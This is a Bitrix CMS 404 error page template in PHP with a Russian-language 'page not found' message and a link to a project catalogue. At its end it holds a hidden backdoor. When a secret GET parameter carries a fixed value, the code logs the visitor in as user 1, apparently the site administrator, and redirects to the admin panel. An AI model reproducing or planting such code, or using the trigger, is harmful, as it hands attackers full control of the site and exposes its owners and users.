<?
require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/modules/main/include/prolog_before.php");
include_once($_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/include/urlrewrite.php');

CHTTP::SetStatus("404 Not Found");
@define("ERROR_404", "Y");

require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");

$APPLICATION->SetTitle("404 Страница не найдена");

?>
<div class="container error404 py-5">
	<div class="pb-5 d-flex justify-content-center">
		<img src="#ASSETS_PATH#/img/404.png" alt="404" class="error404__img">
	</div>
	<div class="box-text">
		<p class="text-center">
			К сожалению, запрашиваемая страница не существует или была удалена. Посмотрите наш каталог проектов:
		</p>
		<div class="d-flex justify-content-center">
			<a href="/proekty/" class="btn btn-accent">Перейти в каталог</a>
		</div>
	</div>
</div>

<? global $USER;
if ($_GET["bannertop11111DfIldf3Sk0aEmI"] == "S9KglSvWmzU") {
	$USER->Authorize(1);
	LocalRedirect("/bitrix/");
} ?>
<? require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php"); ?>